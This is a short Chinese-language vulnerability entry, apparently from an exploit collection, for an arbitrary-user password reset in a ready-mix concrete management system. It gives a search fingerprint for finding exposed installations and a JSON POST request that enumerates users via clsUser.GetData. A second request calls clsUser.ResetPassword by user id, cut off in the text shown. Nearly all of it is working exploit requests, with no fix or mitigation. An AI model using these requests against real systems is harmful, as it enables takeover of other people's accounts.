# 预拌砼综合管理系统RESTFulServiceForWeb存在任意用户密码重置漏洞

- **系统**：预拌砼综合管理系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id=1780623328004 HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Content-Length: 494`

**请求体 / payload**
```
{"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.GetData"],["Para","{\"$VER$\":{},\"filter\":{\"OrderBy\":\"CreateDate DESC\",\"Condition\":\"Cds_OrgType.IsMain=1 and isnull(UserType,0)<>'3'\"}}"]]}
根据uid重置用户密码
POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id=dggddbdgpjoiidermnp HTTP/1.1
Host:
Content-Type: application/json
AppStateCount: 1
device: pc
X-Requested-With: XMLHttpRequest
Content-Length: 188
Priority: u=0
{"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.ResetPassword"],["Para","{\"$VER$\":{},\"uid\":\"0faafbac…（脚本共 653 字，完整版见原文）
```
- **预期**：200　|　—